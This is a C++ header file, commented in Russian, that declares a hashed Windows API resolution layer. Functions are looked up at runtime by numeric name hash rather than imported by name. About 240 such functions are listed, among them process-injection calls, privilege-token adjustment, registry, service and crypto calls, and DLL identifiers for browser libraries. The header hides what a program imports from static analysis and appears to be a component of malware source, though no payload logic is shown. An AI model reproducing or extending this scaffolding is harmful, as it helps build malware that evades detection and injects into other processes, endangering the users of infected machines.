
#ifndef GetApiH
#define GetApiH
//----------------------------------------------------------------------------
#pragma once
#include <windows.h>


//*******************************************************************
//  InitializeAPI - Функция инициализирует систему для работы с АПИ
//
//  ВАЖНО!!!!!!!
//
//  Перед использованием АПИ в процессе необходимо провести
//  инициализацию
//
//
//*******************************************************************
BOOL InitializeAPI();



enum TDllId
{

	DLL_KERNEL32   = 1,
	DLL_ADVAPI32   = 2,
	DLL_USER32     = 3,
	DLL_WINSOCK    = 4,
	DLL_NTDLL      = 5,
	DLL_WINSTA     = 6,
	DLL_SHELL32    = 7,
	DLL_WININET    = 8,
	DLL_URLMON     = 9,
	DLL_NSPR4      = 10,
	DLL_SSL3       = 11,
	DLL_WINMM      = 12,
	DLL_CABINET    = 13,
	DLL_OPERA      = 14,
	DLL_GDI		   = 15,  /* gdi32.dll */
	DLL_GDIPLUS	   = 16,  /* gdiplus.dll */
	DLL_CRYPT32	   = 17,  /* crypt32.dll */
	DLL_PSAPI	   = 18,  /* psapi.dll */
	DLL_SHLWAPI	   = 19,  /* shlwapi.dll */
	DLL_IPHLPAPI   = 20,  /* Iphlpapi.dll */
	DLL_WINSPOOL   = 21,  /* winspool_drv* */
	DLL_COMANDLG32 = 22,  /* commdlg32_dll */
	DLL_ODBC32	   = 23,  /* odbc32_dll */
	DLL_VERSION    = 24,  /* version.dll */
	DLL_OLE32      = 25,  /* ole32.dll */
	DLL_IMAGEHLP   = 26   /* Imagehlp.dll */	
};


//---------------------------------------------------------------------
//  GetDLLName -  Функция возвращает имя библиотеки
//---------------------------------------------------------------------
PCHAR GetDLLName(TDllId ID);

DWORD GetImageBase();


LPVOID GetApiAddr( HMODULE hModule, DWORD dwProcNameHash );
HMODULE GetDllBase( DWORD dwDllHash );
HMODULE GetKernel32();

#define RVATOVA( base, offset ) ( (DWORD)base + (DWORD)offset )

LPVOID GetProcAddressEx( char *Dll, DWORD dwModule, DWORD dwProcNameHash);
LPVOID GetProcAddressEx2( char *Dll, DWORD dwModule, DWORD dwProcNameHash, int CacheIndex);

DWORD pGetLastError();


template <DWORD h, DWORD hash, int CacheIndex>
inline LPVOID pushargEx()
{
	typedef LPVOID (WINAPI *newfunc)();
	newfunc func = (newfunc)GetProcAddressEx2(NULL, h, hash, CacheIndex );
	return func();
}

template <DWORD h, DWORD hash, int CacheIndex, class A>
inline LPVOID pushargEx(A a1)
{
	typedef LPVOID (WINAPI *newfunc)(A);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1);
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B>
inline LPVOID pushargEx(A a1,  B a2)
{
	typedef LPVOID (WINAPI *newfunc)(A, B);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1,a2);
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C>
inline LPVOID pushargEx(A a1,  B a2, C a3)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1,a2,a3);
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1,a2,a3,a4);
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1, a2, a3, a4, a5);
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E, class F>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1, a2, a3, a4, a5, a6);
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E, class F, class G>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1, a2, a3, a4, a5, a6, a7);
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E, class F, class G, class H>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1, a2, a3, a4, a5, a6, a7, a8);
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E, class F, class G, class H, class I>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H, I);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1, a2, a3, a4, a5, a6, a7, a8, a9);
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E, class F, class G, class H, class I, class X>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9, X a10)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H, I, X);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10);
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E, class F, class G, class H, class I, class X, class Y>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9, X a10, Y a11 )
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H, I, X, Y);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11);
}

template <DWORD h, DWORD hash, int CacheIndex, class A, class B, class C, class D, class E, class F, class G, class H, class I, class X, class Y, class Z, class R>
inline LPVOID pushargEx(A a1, B a2, C a3, D a4, E a5, F a6, G a7, H a8, I a9, X a10, Y a11, Z a12, R a13)
{
	typedef LPVOID (WINAPI *newfunc)(A, B, C, D, E, F, G, H, I, X, Y, Z, R);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12, a13);
}

template <DWORD h, DWORD hash, int CacheIndex, class A1, class A2, class A3, class A4, class A5,
	class A6, class A7, class A8, class A9, class A10, class A11, class A12>
inline LPVOID pushargEx(A1 a1, A2 a2, A3 a3, A4 a4, A5 a5, A6 a6, A7 a7, A8 a8,
						A9 a9, A10 a10, A11 a11, A12 a12)
{
	typedef LPVOID (WINAPI *newfunc)(A1, A2, A3, A4, A5, A6, A7, A8, A9, A10,
									A11, A12);
	newfunc func = (newfunc)GetProcAddressEx2( NULL, h, hash, CacheIndex );
	return func(a1, a2, a3, a4, a5, a6, a7, a8, a9, a10, a11, a12);
}




//******************************************************************
//
//  ФАЖНО!!!!
//
//  Индексы кэша (третий параметр в объявлении) строжайше запрещено
//  менять вручную!!!!
//
//  Индексы кэша автоматически проставляет служебная утилита.
//  При добавлении новой функции, индекс указывать 0
//
//  Например:
//
//  #define pCustomFunc pushargEx< DLL_KERNEL32, 0xC8AC8026, 0 >
//
//******************************************************************


//**************************************************
// Размер кэша хранения адресов функций
//
// Значение автоматически устанавливается утилитой
//
// Не переименовывать, не изменять!!!!!!!
//
//**************************************************
const static int ApiCacheSize = 534;



//kernel32
#define pLoadLibraryA 				pushargEx< DLL_KERNEL32, 0xC8AC8026, 1 >
#define pLoadLibraryW 				pushargEx< DLL_KERNEL32, 0xC8AC8030, 2 >
#define pLoadLibraryExA 			pushargEx< DLL_KERNEL32, 0x20088E6A, 3 >
#define pLoadLibraryExW 			pushargEx< DLL_KERNEL32, 0x20088E7C, 4 >
#define pFreeLibrary 				pushargEx< DLL_KERNEL32, 0x4B935B8E, 5 >
#define pGetProcAddress 			pushargEx< DLL_KERNEL32, 0x1FC0EAEE, 6 >
#define pTerminateProcess			pushargEx< DLL_KERNEL32, 0x9E6FA842, 7 >
#define pVirtualAlloc 				pushargEx< DLL_KERNEL32, 0x697A6AFE, 8 >
#define pVirtualAllocEx 			pushargEx< DLL_KERNEL32, 0x9ABFB8A6, 9 >
#define pVirtualFree 				pushargEx< DLL_KERNEL32, 0x3A35705F, 10 >
#define pVirtualFreeEx 				pushargEx< DLL_KERNEL32, 0x5C17EC75, 11 >
#define pVirtualQuery 				pushargEx< DLL_KERNEL32, 0x6A582465, 12 >
#define pVirtualQueryEx 			pushargEx< DLL_KERNEL32, 0x919786E, 13 >
#define pVirtualProtect 			pushargEx< DLL_KERNEL32, 0xA9DE6F5A, 14 >
#define pVirtualProtectEx 			pushargEx< DLL_KERNEL32, 0x9BD6888F, 15 >
#define pCloseHandle 				pushargEx< DLL_KERNEL32, 0x723EB0D5, 16 >
#define pGlobalAlloc 				pushargEx< DLL_KERNEL32, 0x725EA171, 17 >
#define pGlobalFree 				pushargEx< DLL_KERNEL32, 0x240339C8, 18 >
#define pCreateFileA 				pushargEx< DLL_KERNEL32, 0x8F8F114, 19 >
#define pCreateFileW 				pushargEx< DLL_KERNEL32, 0x8F8F102, 20 >
#define pWriteFile 					pushargEx< DLL_KERNEL32, 0xF3FD1C3, 21 >
#define pGetCurrentDirectoryA		pushargEx< DLL_KERNEL32, 0xC80715CE, 22 >
#define pWriteProcessMemory 		pushargEx< DLL_KERNEL32, 0xBEA0BF35, 23 >
#define pCreateRemoteThread 		pushargEx< DLL_KERNEL32, 0xE61874B3, 24 >
#define pReadFile 					pushargEx< DLL_KERNEL32, 0x487FE16B, 25 >
#define pSetFilePointer 			pushargEx< DLL_KERNEL32, 0xEF48E03A, 26 >
#define pSetEndOfFile 				pushargEx< DLL_KERNEL32, 0x2D0D9D61, 27 >
#define pCopyFileA 					pushargEx< DLL_KERNEL32, 0x2EE4F10D, 28 >
#define pCopyFileW 					pushargEx< DLL_KERNEL32, 0x2EE4F11B, 29 >
#define pMoveFileA 					pushargEx< DLL_KERNEL32, 0x20E4E9ED, 30 >
#define pMoveFileW 					pushargEx< DLL_KERNEL32, 0x20E4E9FB, 31 >
#define pMoveFileExA 				pushargEx< DLL_KERNEL32, 0x3A7A7478, 32 >
#define pMoveFileExW 				pushargEx< DLL_KERNEL32, 0x3A7A746E, 33 >
#define pDeleteFileA 				pushargEx< DLL_KERNEL32, 0x81F0F0DF, 34 >
#define pDeleteFileW 				pushargEx< DLL_KERNEL32, 0x81F0F0C9, 35 >
#define pGetFileSize 				pushargEx< DLL_KERNEL32, 0xAEF7CBF1, 36 >
#define pCreateFileMappingA 		pushargEx< DLL_KERNEL32, 0xEF0A25B7, 37 >
#define pCreateFileMappingW 		pushargEx< DLL_KERNEL32, 0xEF0A25A1, 38 >
#define pMapViewOfFile 				pushargEx< DLL_KERNEL32, 0x5CD9430, 39 >
#define pGetFileTime 				pushargEx< DLL_KERNEL32, 0xAE17C071, 40 >
#define pSetFileTime 				pushargEx< DLL_KERNEL32, 0xAE17C571, 41 >
#define pGetModuleHandleA 			pushargEx< DLL_KERNEL32, 0xA48D6762, 42 >
#define pGetModuleHandleW 			pushargEx< DLL_KERNEL32, 0xA48D6774, 43 >
#define pUnmapViewOfFile 			pushargEx< DLL_KERNEL32, 0x77CD9567, 44 >
#define pWaitForSingleObject 		pushargEx< DLL_KERNEL32, 0xC54374F3, 45 >
#define pSleep 						pushargEx< DLL_KERNEL32, 0x3D9972F5, 46 >
#define pWideCharToMultiByte 		pushargEx< DLL_KERNEL32, 0xE74F57EE, 47 >
#define pMultiByteToWideChar 		pushargEx< DLL_KERNEL32, 0x5AA7E70B, 48 >
#define pGetModuleFileNameA 		pushargEx< DLL_KERNEL32, 0x774393E8, 49 >
#define pGetModuleFileNameW 		pushargEx< DLL_KERNEL32, 0x774393FE, 50 >
#define pGetSystemDirectoryA 		pushargEx< DLL_KERNEL32, 0x49A1374A, 51 >
#define pGetSystemDirectoryW 		pushargEx< DLL_KERNEL32, 0x49A1375C, 52 >
#define pGetTempPathA 				pushargEx< DLL_KERNEL32, 0x58FE7ABE, 53 >
#define pGetTempPathW 				pushargEx< DLL_KERNEL32, 0x58FE7AA8, 54 >
#define pGetVolumeInformationA 		pushargEx< DLL_KERNEL32, 0x67ECDE97, 55 >
#define pGetVolumeInformationW 		pushargEx< DLL_KERNEL32, 0x67ECDE81, 56 >
#define pSetFileAttributesA 		pushargEx< DLL_KERNEL32, 0x4D5587B7, 57 >
#define pSetFileAttributesW 		pushargEx< DLL_KERNEL32, 0x4D5587A1, 58 >
#define pCreateProcessA 			pushargEx< DLL_KERNEL32, 0x46318AC7, 59 >
#define pCreateProcessW 			pushargEx< DLL_KERNEL32, 0x46318AD1, 60 >
#define pGetVersionExA 				pushargEx< DLL_KERNEL32, 0x9C480E24, 61 >
#define pGetVersionExW 				pushargEx< DLL_KERNEL32, 0x9C480E32, 62 >
#define pCreateThread 				pushargEx< DLL_KERNEL32, 0x6FB89AF0, 63 >
#define pSetThreadPriority			pushargEx< DLL_KERNEL32, 0xBC262395, 64 >
#define pCreateMutexA 				pushargEx< DLL_KERNEL32, 0xBF78969C, 65 >
#define pCreateMutexW 				pushargEx< DLL_KERNEL32, 0xBF78968A, 66 >
#define pReleaseMutex 				pushargEx< DLL_KERNEL32, 0xBB74A4A2, 67 >
#define pGetVersion 				pushargEx< DLL_KERNEL32, 0xCB932CE2, 68 >
#define pDeviceIoControl 			pushargEx< DLL_KERNEL32, 0x82E8173, 69 >
#define pQueryDosDeviceA 			pushargEx< DLL_KERNEL32, 0xAC81BECB, 70 >
#define pQueryDosDeviceW 			pushargEx< DLL_KERNEL32, 0xAC81BEDD, 71 >
#define pIsBadReadPtr 				pushargEx< DLL_KERNEL32, 0x7D544DBD, 72 >
#define pIsBadWritePtr 				pushargEx< DLL_KERNEL32, 0xAC85818D, 73 >
#define pGetCurrentProcess 			pushargEx< DLL_KERNEL32, 0xD89AD05, 74 >
#define pCreateEventW 				pushargEx< DLL_KERNEL32, 0x8D5A50CA, 75 >
#define pSetEvent 					pushargEx< DLL_KERNEL32, 0x5E7EE0D0, 76 >
#define pResetEvent 				pushargEx< DLL_KERNEL32, 0x3B3EE0F9, 77 >
#define pGetShortPathNameA 			pushargEx< DLL_KERNEL32, 0x223296ED, 78 >
#define pGetShortPathNameW 			pushargEx< DLL_KERNEL32, 0x223296FB, 79 >
#define pLocalFree 					pushargEx< DLL_KERNEL32, 0x84033DEB, 80 >
#define pGetPrivateProfileStringA 	pushargEx< DLL_KERNEL32, 0xAA19E291, 81 >
#define pGetPrivateProfileStringW 	pushargEx< DLL_KERNEL32, 0xAA19E287, 82 >
#define pGetFileAttributesA 		pushargEx< DLL_KERNEL32, 0x475587B7, 83 >
#define pGetFileAttributesW 		pushargEx< DLL_KERNEL32, 0x475587A1, 84 >
#define pGetEnvironmentVariableA 	pushargEx< DLL_KERNEL32, 0x9802EF30, 85 >
#define pGetEnvironmentVariableW 	pushargEx< DLL_KERNEL32, 0x9802EF26, 86 >
#define pReadProcessMemory 			pushargEx< DLL_KERNEL32, 0x9D00A761, 87 >
#define pExitProcess 				pushargEx< DLL_KERNEL32, 0x95902B19, 88 >
#define pOpenProcess 				pushargEx< DLL_KERNEL32, 0x99A4299D, 89 >
#define pGetCurrentProcessId		pushargEx< DLL_KERNEL32, 0x6B416786, 90 >
#define pProcess32First 			pushargEx< DLL_KERNEL32, 0x19F78C90, 91 >
#define pProcess32Next 				pushargEx< DLL_KERNEL32, 0xC930EA1E, 92 >
#define pCreateToolhelp32Snapshot	pushargEx< DLL_KERNEL32, 0x5BC1D14F, 93 >
#define pWinExec 					pushargEx< DLL_KERNEL32, 0xE8BF6DAD, 94 >
#define pFindResourceA 				pushargEx< DLL_KERNEL32, 0x8FE060C, 95 >
#define pSetLastError 				pushargEx< DLL_KERNEL32, 0x1295012C, 96 >
#define pLoadResource 				pushargEx< DLL_KERNEL32, 0x1A10BD8B, 97 >
#define pLockResource 				pushargEx< DLL_KERNEL32, 0x1510BD8A, 98 >
#define pSizeofResource 			pushargEx< DLL_KERNEL32, 0x86867F0E, 99 >
#define pLockRsrc 					pushargEx< DLL_KERNEL32, 0xBAC5467D, 100 >
#define pGetTempFileNameA 			pushargEx< DLL_KERNEL32, 0xFA4F502, 101 >
#define pGetTempFileNameW 			pushargEx< DLL_KERNEL32, 0xFA4F514, 102 >
#define pGetLongPathNameA 			pushargEx< DLL_KERNEL32, 0x9835D5A1, 103 >
#define pCreateEventA				pushargEx< DLL_KERNEL32, 0x8D5A50DC, 104 >
#define pConnectNamedPipe			pushargEx< DLL_KERNEL32, 0x7235F00E, 105 >
#define pDisconnectNamedPipe   		pushargEx< DLL_KERNEL32, 0x46C6B01F, 106 >
#define pCreateNamedPipeA			pushargEx< DLL_KERNEL32, 0x42F9BB48, 107 >
#define pGetTickCount				pushargEx< DLL_KERNEL32, 0x69260152, 108 >
#define pExitThread					pushargEx< DLL_KERNEL32, 0x768AA260, 109 >
#define plstrcmpiA					pushargEx< DLL_KERNEL32, 0x515BE757, 110 >
#define pSuspendThread				pushargEx< DLL_KERNEL32, 0xEEBA5EBA, 111 >
#define pGetComputerNameA			pushargEx< DLL_KERNEL32, 0x3DEF91BA, 112 >
#define pGetThreadContext			pushargEx< DLL_KERNEL32, 0xAA1DE02F, 113 >
#define pSetThreadContext			pushargEx< DLL_KERNEL32, 0xAA1DC82F, 114 >
#define pResumeThread				pushargEx< DLL_KERNEL32, 0x7B88BF3B, 115 >
#define pProcessIdToSessionId		pushargEx< DLL_KERNEL32, 0x654F3F9E, 116 >
#define	pWTSGetActiveConsoleSessionId	pushargEx< DLL_KERNEL32, 0x654FEEAC, 117 >
#define pOpenMutexA					pushargEx< DLL_KERNEL32, 0xAE52C609, 118 >
#define pCreateProcessInternalA		pushargEx< DLL_KERNEL32, 0xE24394E4, 119 >
#define pCreateProcessInternalW		pushargEx< DLL_KERNEL32, 0xE24394F2, 120 >
#define pTerminateThread			pushargEx< DLL_KERNEL32, 0xC09D5D66, 121 >
#define plopen						pushargEx< DLL_KERNEL32, 0xCDFC3010, 122 >
#define plstrcmpA					pushargEx< DLL_KERNEL32, 0x2CA2B7E6, 123 >
#define plstrcmpW					pushargEx< DLL_KERNEL32, 0x2CA2B7F0, 124 >
#define plstrcatA					pushargEx< DLL_KERNEL32, 0x2CA1B5E6, 125 >
#define plstrcatW					pushargEx< DLL_KERNEL32, 0x2CA1B5F0, 126 >
#define plstrcpyA					pushargEx< DLL_KERNEL32, 0x2CA5F366, 127 >
#define plstrcpyW					pushargEx< DLL_KERNEL32, 0x2CA5F370, 128 >
#define plstrlenA					pushargEx< DLL_KERNEL32, 0x2D40B8E6, 129 >
#define plstrlenW					pushargEx< DLL_KERNEL32, 0x2D40B8F0, 130 >
#define pThread32First				pushargEx< DLL_KERNEL32, 0x89B968D2, 131 >
#define pThread32Next				pushargEx< DLL_KERNEL32, 0x4C1077D6, 132 >
#define pOpenThread					pushargEx< DLL_KERNEL32, 0x7E92CA65, 133 >
#define pGetWindowsDirectoryA		pushargEx< DLL_KERNEL32, 0x78B00C7E, 134 >
#define pGetWindowsDirectoryW		pushargEx< DLL_KERNEL32, 0x78B00C68, 135 >
#define pFindFirstFileA				pushargEx< DLL_KERNEL32, 0x32432444, 136 >
#define pFindFirstFileW				pushargEx< DLL_KERNEL32, 0x32432452, 137 >
#define pFindNextFileA				pushargEx< DLL_KERNEL32, 0x279DEAD7, 138 >
#define pFindNextFileW				pushargEx< DLL_KERNEL32, 0x279DEAC1, 139 >
#define pFindClose  				pushargEx< DLL_KERNEL32, 0x7B4842C1, 140 >
#define pRemoveDirectoryA			pushargEx< DLL_KERNEL32, 0x4AE7572B, 141 >
#define pInitializeCriticalSection	pushargEx< DLL_KERNEL32, 0xDA81BC58, 142 >
#define pEnterCriticalSection		pushargEx< DLL_KERNEL32, 0xF3B84F05, 143 >
#define pLeaveCriticalSection		pushargEx< DLL_KERNEL32, 0x392B6027, 144 >
#define pDeleteCriticalSection		pushargEx< DLL_KERNEL32, 0x7B2D2505, 145 >
#define pGetProcessHeap				pushargEx< DLL_KERNEL32, 0x68807354, 146 >
#define pHeapAlloc					pushargEx< DLL_KERNEL32, 0x5550B067, 147 >
#define pHeapReAlloc				pushargEx< DLL_KERNEL32, 0xFC7A6EFD, 148 >
#define pHeapSize					pushargEx< DLL_KERNEL32, 0x0AEBEA6A, 149 >
#define pHeapFree					pushargEx< DLL_KERNEL32, 0x084D25EA, 150 >
#define pGetCurrentThreadId			pushargEx< DLL_KERNEL32, 0xA45B370A, 151 >
#define pGetCurrentThread   		pushargEx< DLL_KERNEL32, 0x4FBA916C, 152 >
#define	pGlobalLock					pushargEx< DLL_KERNEL32, 0x25447AC6, 153 >
#define	pGlobalUnlock				pushargEx< DLL_KERNEL32, 0xF50B872, 154 >
#define pSetErrorMode				pushargEx< DLL_KERNEL32, 0x6C544060, 155 >
#define pGetFileInformationByHandle pushargEx< DLL_KERNEL32, 0xF149BCC4, 156 >
#define pFileTimeToLocalFileTime	pushargEx< DLL_KERNEL32, 0xE5792E94, 157 >
#define pFileTimeToDosDateTime		pushargEx< DLL_KERNEL32, 0xB68EBEF8, 158 >
#define pOutputDebugStringA			pushargEx< DLL_KERNEL32, 0xD0498CD4, 159 >
#define pExpandEnvironmentStringsA	pushargEx< DLL_KERNEL32, 0x23EBE98B, 160 >
#define pExpandEnvironmentStringsW	pushargEx< DLL_KERNEL32, 0x23EBE99D, 161 >
#define pOutputDebugStringW			pushargEx< DLL_KERNEL32, 0xD0498CC2, 162 >
#define pLocalAlloc 				pushargEx< DLL_KERNEL32, 0x725CB0A1, 163 >
#define pFindFirstChangeNotificationA pushargEx< DLL_KERNEL32, 0xE8402F0, 164 >
#define pFindCloseChangeNotification  pushargEx< DLL_KERNEL32, 0x3634D801, 165 >
#define pFindNextChangeNotification   pushargEx< DLL_KERNEL32, 0xFAB3FE71, 166 >
#define pCreateDirectoryW			  pushargEx< DLL_KERNEL32, 0xA073561, 167 >
#define pCreateDirectoryA		    pushargEx< DLL_KERNEL32, 0xA073577, 168 >
#define pOpenEventW					pushargEx< DLL_KERNEL32, 0x9C70005F, 169 >
#define pGetSystemTimeAsFileTime	pushargEx< DLL_KERNEL32, 0x6951E92A, 170 >
#define pGetSystemTime 				pushargEx< DLL_KERNEL32, 0x270118E2, 171 >
#define pFileTimeToSystemTime		pushargEx< DLL_KERNEL32, 0x3B429F5F, 172 >
#define pCompareFileTime			pushargEx< DLL_KERNEL32, 0x41C9C8F5, 173 >
#define pSystemTimeToFileTime		pushargEx< DLL_KERNEL32, 0xEA7EA921, 174 >
#define pGetLogicalDriveStringsA  	pushargEx< DLL_KERNEL32, 0x70F6FE31, 175 >
#define pGetDriveTypeA          	pushargEx< DLL_KERNEL32, 0x399354CE, 176 >
#define pSleepEx				 	pushargEx< DLL_KERNEL32, 0x5CBD6D9E, 177 >
#define pGetProcessId				pushargEx< DLL_KERNEL32, 0x0e91a280, 178 >
#define pOpenEventA					pushargEx< DLL_KERNEL32, 0x9C700049, 179 >
#define pSetCurrentDirectoryW		pushargEx< DLL_KERNEL32, 0xc8071758, 180 >
#define pSetCurrentDirectoryA		pushargEx< DLL_KERNEL32, 0xc807174e, 181 >
#define pDuplicateHandle			pushargEx< DLL_KERNEL32, 0x533d3b41, 182 >
#define pGetExitCodeThread			pushargEx< DLL_KERNEL32, 0x4E5A10B1, 183 >
#define pGetCommandLineA			pushargEx< DLL_KERNEL32, 0xFB0730C, 184 >
#define pGetPrivateProfileIntA		pushargEx< DLL_KERNEL32, 0x11CC0678, 185 >
#define pProcess32FirstW 			pushargEx< DLL_KERNEL32, 0xFBC6485B, 186 >
#define pProcess32NextW				pushargEx< DLL_KERNEL32, 0x98750F33, 187 >
#define pGetLogicalDrives			pushargEx< DLL_KERNEL32, 0x6A3376B7, 188 >
#define pInterlockedIncrement		pushargEx< DLL_KERNEL32, 0xD03C6D18, 189 >
#define pInterlockedDecrement		pushargEx< DLL_KERNEL32, 0xDD2A6D18, 190 >
#define pFlushViewOfFile			pushargEx< DLL_KERNEL32, 0x664FD32B, 191 >
#define pGetExitCodeProcess			pushargEx< DLL_KERNEL32, 0xFDC94385, 192 >

//advapi32
#define pCreateProcessAsUserA		pushargEx< DLL_ADVAPI32, 0x985267C4, 193 >
#define pSetThreadToken				pushargEx< DLL_ADVAPI32, 0xA16FE0FD, 194 >
#define pOpenProcessToken 			pushargEx< DLL_ADVAPI32, 0x80DBBE07, 195 >
#define pLookupPrivilegeValueA 		pushargEx< DLL_ADVAPI32, 0x1B3D12B9, 196 >
#define pLookupPrivilegeValueW 		pushargEx< DLL_ADVAPI32, 0x1B3D12AF, 197 >
#define pAdjustTokenPrivileges 		pushargEx< DLL_ADVAPI32, 0x7A2167DC, 198 >
#define pRegOpenKeyExA 				pushargEx< DLL_ADVAPI32, 0xAAD67FF8, 199 >
#define pRegOpenKeyExW 				pushargEx< DLL_ADVAPI32, 0xAAD67FEE, 200 >
#define pRegQueryInfoKeyA 			pushargEx< DLL_ADVAPI32, 0xBDF4DB19, 201 >
#define pRegQueryInfoKeyW 			pushargEx< DLL_ADVAPI32, 0xBDF4DB0F, 202 >
#define pRegEnumKeyExA 				pushargEx< DLL_ADVAPI32, 0xB4F673FD, 203 >
#define pRegEnumKeyExW 				pushargEx< DLL_ADVAPI32, 0xB4F673EB, 204 >
#define pRegEnumValueA 				pushargEx< DLL_ADVAPI32, 0xF65A7D95, 205 >
#define pRegEnumValueW 				pushargEx< DLL_ADVAPI32, 0xF65A7D83, 206 >
#define pRegQueryValueExA 			pushargEx< DLL_ADVAPI32, 0x1802E7C8, 207 >
#define pRegQueryValueExW 			pushargEx< DLL_ADVAPI32, 0x1802E7DE, 208 >
#define pRegCloseKey 				pushargEx< DLL_ADVAPI32, 0xDB355534, 209 >
#define pRegDeleteKeyA 				pushargEx< DLL_ADVAPI32, 0x398C5285, 210 >
#define pRegDeleteKeyW 				pushargEx< DLL_ADVAPI32, 0x398C5293, 211 >
#define pRegSetValueExA 			pushargEx< DLL_ADVAPI32, 0x3E400FD6, 212 >
#define pRegSetValueExW 			pushargEx< DLL_ADVAPI32, 0x3E400FC0, 213 >
#define pGetUserNameA 				pushargEx< DLL_ADVAPI32, 0xB9D41C2F, 214 >
#define pGetUserNameW 				pushargEx< DLL_ADVAPI32, 0xB9D41C39, 215 >
#define pOpenServiceA 				pushargEx< DLL_ADVAPI32, 0x83969964, 216 >
#define pStartServiceA 				pushargEx< DLL_ADVAPI32, 0x1CA1FD2F, 217 >
#define pGetKernelObjectSecurity 	pushargEx< DLL_ADVAPI32, 0xB29136DD, 218 >
#define pOpenSCManagerA 			pushargEx< DLL_ADVAPI32, 0xA06E459C, 219 >
#define pGetCurrentHwProfileA		pushargEx< DLL_ADVAPI32, 0xF684C7A9, 220 >
#define pGetTokenInformation		pushargEx< DLL_ADVAPI32, 0xD4ECC759, 221 >
#define pInitializeSecurityDescriptor	pushargEx< DLL_ADVAPI32, 0xB8538A52, 222 >
#define pSetSecurityDescriptorOwner	pushargEx< DLL_ADVAPI32, 0xDADD5994, 223 >
#define pSetSecurityDescriptorDacl	pushargEx< DLL_ADVAPI32,0xCCD03C3A, 224 >
#define pSetFileSecurityW			pushargEx< DLL_ADVAPI32, 0x5A9B2FDD, 225 >
#define pRegCreateKeyW				pushargEx< DLL_ADVAPI32, 0xAE9E4290, 226 >
#define pRegCreateKeyA				pushargEx< DLL_ADVAPI32, 0xAE9E4286, 227 >
#define pRegCreateKeyExW			pushargEx< DLL_ADVAPI32, 0x90A097F0, 228 >
#define pRegCreateKeyExA			pushargEx< DLL_ADVAPI32, 0x90A097E6, 229 >
#define pRegSaveKeyA				pushargEx< DLL_ADVAPI32, 0xBEDEEFC5, 230 >
#define pRegSaveKeyW				pushargEx< DLL_ADVAPI32, 0xBEDEEFD3, 231 >
#define pRegSaveKeyExA				pushargEx< DLL_ADVAPI32, 0xBBF053F6, 232 >
#define pRegSaveKeyExW				pushargEx< DLL_ADVAPI32, 0xBBF053E0, 233 >
#define pCryptAcquireContextA		pushargEx< DLL_ADVAPI32, 0x8AD7DE34, 234 >
#define pCryptReleaseContext		pushargEx< DLL_ADVAPI32, 0x72760BB8, 235 >
#define pCryptImportKey     		pushargEx< DLL_ADVAPI32, 0x78660DBE, 236 >
#define pCryptEncrypt    	    	pushargEx< DLL_ADVAPI32, 0xCEBF13BE, 237 >
#define pCryptDecrypt    	    	pushargEx< DLL_ADVAPI32, 0xCEBF17E6, 238 >
#define pCryptSetKeyParam   		pushargEx< DLL_ADVAPI32, 0x37A53419, 239 >
#define pCryptDestroyKey    		pushargEx< DLL_ADVAPI32, 0xD4B3D42, 240 >
#define pControlService				pushargEx< DLL_ADVAPI32, 0x5FFEE3F1, 241 >
#define pQueryServiceStatusEx		pushargEx< DLL_ADVAPI32, 0xF6C712F4, 242 >
#define pRegDeleteValueA			pushargEx< DLL_ADVAPI32, 0x560c7c4a, 243 >
#define pCloseServiceHandle			pushargEx< DLL_ADVAPI32, 0x78CEC357, 244 >
